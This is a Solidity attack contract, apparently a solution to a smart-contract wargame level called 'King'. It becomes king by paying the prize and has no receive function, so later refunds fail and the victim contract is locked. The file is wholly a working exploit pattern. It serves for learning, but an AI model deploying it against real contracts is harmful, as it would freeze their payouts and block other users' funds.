// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

interface IKing {
    receive() external payable;
    function prize() external returns (uint256 val);
}

interface IMyKingAttack {
    function attack() external payable;
}
// the contract has no receive/fallback functions, so it would not accept transfers in most cases
// excepts coinbase tx and selfdestruct transfers
// but that's enough for the level
contract MyKingAttack is IMyKingAttack {
    address payable private _kingInstanceAddress;

    error ValueIsLessThanPrize(uint256 value, uint256 prize);
    error ExternalCallFailure();

    constructor(address payable kingInstanceAddress) {
        _kingInstanceAddress = kingInstanceAddress;
    }

    function attack() external payable override {
        uint256 prize = IKing(_kingInstanceAddress).prize();
        if (msg.value < prize) {
            revert ValueIsLessThanPrize(msg.value, prize);
        }
        (bool success, ) = _kingInstanceAddress.call{ value: msg.value }("");
        if (!success) {
            revert ExternalCallFailure();
        }
    }

    // in real life we would add some withdraw functionality
}
